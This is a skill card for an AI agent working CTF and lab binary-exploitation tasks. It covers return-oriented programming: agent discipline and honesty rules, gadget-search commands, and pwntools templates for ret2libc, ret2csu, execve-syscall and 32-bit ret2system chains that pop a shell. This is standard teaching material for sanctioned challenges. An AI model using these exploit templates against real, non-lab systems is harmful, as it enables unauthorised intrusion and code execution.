---
name: pwn-rop
evidence_level: catalogue
description: >
  Return-Oriented Programming (ROP) chain construction. Use when binary has
  NX enabled and requires code reuse for exploitation. Covers basic ROP,
  ret2libc, ret2csu, ROPgadget/ropper usage, and chain automation.
tags: [pwn, rop, ret2libc, code-reuse, gadgets]
environment: [ctf, lab]
budget:
  max_attempts: 5
  stuck_threshold: 3
  time_hint: "45m"
  on_stuck: escalate
  stop_conditions:
    - "gadget chain incomplete for goal"
    - "leak+reentry loop fails twice"
    - "stack alignment unresolved after standard fixes"
---

# ROP Chain Construction

**Catalogue class.** The taxonomy classes that route here — `pwn-code-reuse` — are
all `catalogue`: this toolkit has never solved one, and the measured count of
chain cards in this category is zero. What follows is standard published
knowledge plus the tools actually installed on this machine, not local
experience. Never say a technique here worked here. Record what really
happens in `field-notes.md`, and the label rises to `verified` only through a
chain card and `tools/classify_solve.py`, never by editing the taxonomy.

## Read this before the Quick Reference below

**`ROPgadget`, `ropper`, `one_gadget`, `pwntools`, `gdb` and `checksec` are all
measured ABSENT on this machine, and `pip` here is EXTERNALLY-MANAGED.** The
"ROPgadget Commands" and "ropper Commands" sections further down are published
reference for a machine that has them; on this one those commands fail at the
shell. What exists here instead:

```bash
python3 tools/pwn_triage.py <binary>    # protections WITH the evidence for each,
                                       # dangerous imports, essential gadgets,
                                       # and the routes each protection leaves
r2 -A <binary>                          # analyse;  afl lists functions
r2 -d <binary>                          # the debugger here, since gdb is absent
```

Inside radare2, `/R pop rdi` searches for ROP sequences. Build payloads with
`struct.pack` and deliver them with `socat` or a stdlib socket, never with
`pwntools`.

## First probe

**This class presupposes control of the instruction pointer.** Confirm that
first, or you are in the wrong skill: `pwn-stack-overflow` and
`pwn-format-string` are the two that establish it.

The first probe is therefore a question to the triage output, not a payload:

```bash
python3 tools/pwn_triage.py <binary> | head -40
```

**Expected signal.** Read three facts off it before writing anything.

| Fact in the triage output | What it decides |
|---|---|
| `nx: true` | code reuse is the route; shellcode on the stack is not |
| `pie: false` | the binary's own gadgets have fixed addresses, so no leak is needed for them |
| `relro: full` | a GOT overwrite is closed, whatever the leak is worth |
| a `system` or `/bin/sh` entry in the imports or strings | the chain may be short; check before building a libc leak |

If `pie` is true you need a leak first: build and fire the leak chain alone, and
**verify the leaked value looks like a libc address** before chaining further. A
chain built on an unverified leak fails for a reason you cannot see.

## Falsifier

The gadgets actually present cannot express the call: no controllable argument
register for the target function, or no writable page to pivot into. That is a
measurement from the executable segments `tools/pwn_triage.py` scanned, not an
opinion, and it closes the route rather than suggesting a different chain.

## Discipline and traps

- **Never claim a gadget you did not see in real output.** No invented address,
  no remembered offset. The repository rule applies hardest here, because a ROP
  chain is entirely made of addresses.
- **A crash is not a flag.** Report the exact signal and the value you
  controlled at the fault, not "it segfaults so the chain nearly works".
- **x86-64 libc calls need stack alignment**; the `ret` padding trick is in the
  Stack Alignment section below. A chain that works locally and not remotely is
  usually alignment or environment, not the gadgets.
- **Attempt ceiling: five chains.** On exhaustion report which chains are
  measured dead with the measurement that killed each, so the next agent does
  not rebuild them. `tools/decide.py` will answer `escalate` rather than ending
  the challenge.


## Quick Reference

### ROPgadget Commands
```bash
ROPgadget --binary ./binary --ropchain                    # Auto generate chain
ROPgadget --binary ./binary --only "pop|ret" | grep rdi  # Pop rdi gadget
ROPgadget --binary ./binary --only "pop|ret" | grep rsi  # Pop rsi gadget
ROPgadget --binary ./binary --only "pop|ret" | grep rdx  # Pop rdx gadget
ROPgadget --binary ./binary --search "/bin/sh"           # String search
ROPgadget --binary ./binary --only "syscall|ret"        # Syscall gadgets
ROPgadget --binary ./binary --only "int 0x80"           # 32-bit syscall
```

### ropper Commands
```bash
ropper --file ./binary --search "pop rdi; ret"
ropper --file ./binary --search "pop rsi; ret"
ropper --file ./binary --search "pop rdx; ret"
ropper --file ./binary --search "syscall"
ropper --file ./binary --search "mov rdi, rsp"
```

## ret2libc Template

```python
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process()

# Leak libc via puts
rop = ROP(elf)
offset = 72

payload = flat(
    b'A' * offset,
    rop.find_gadget(['pop rdi', 'ret'])[0],
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
)
p.sendline(payload)

puts_leak = u64(p.recvline().ljust(8, b'\x00'))
libc.address = puts_leak - libc.sym['puts']

# Shell
ret = libc.address + next(rop.find_gadget(['ret']))
pop_rdi = libc.address + next(rop.find_gadget(['pop rdi', 'ret']))
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

payload = flat(
    b'A' * offset,
    ret,           # Stack alignment
    pop_rdi,
    bin_sh,
    system
)
p.sendline(payload)
p.interactive()
```

## ret2csu

```python
csu_init_addr = elf.sym['__libc_csu_init']
csu_gadget1 = csu_init_addr + 65
csu_gadget2 = csu_init_addr + 83

def ret2csu(func_ptr, rdi, rsi, rdx):
    return flat(
        csu_gadget1,
        0,  # rbx
        1,  # rbp (rbx+1 == rbp)
        func_ptr - 8,  # r12
        rdi,
        rsi,
        rdx,
        csu_gadget2,
        b'A' * 56,
    )
```

## execve via syscall

```python
rop = ROP(elf)
payload = flat(
    b'A' * offset,
    rop.find_gadget(['pop rax', 'ret'])[0],
    59,  # execve
    rop.find_gadget(['pop rdi', 'ret'])[0],
    next(elf.search(b'/bin/sh\x00')),
    rop.find_gadget(['pop rsi', 'ret'])[0],
    0,
    rop.find_gadget(['pop rdx', 'ret'])[0],
    0,
    rop.find_gadget(['syscall', 'ret'])[0],
)
```

## Stack Alignment

```python
# x86-64 needs stack alignment before libc calls
ret = rop.find_gadget(['ret'])[0]
payload = flat(b'A' * offset, ret, pop_rdi, bin_sh, system)
```

## 32-bit ret2system

```python
payload = flat(
    b'A' * offset,
    elf.plt['system'],
    0xdeadbeef,
    next(elf.search(b'/bin/sh\x00')),
)
```

## References
- `references/rop-chains.md` - Advanced ROP techniques
- `references/ret2libc.md` - ret2libc in depth
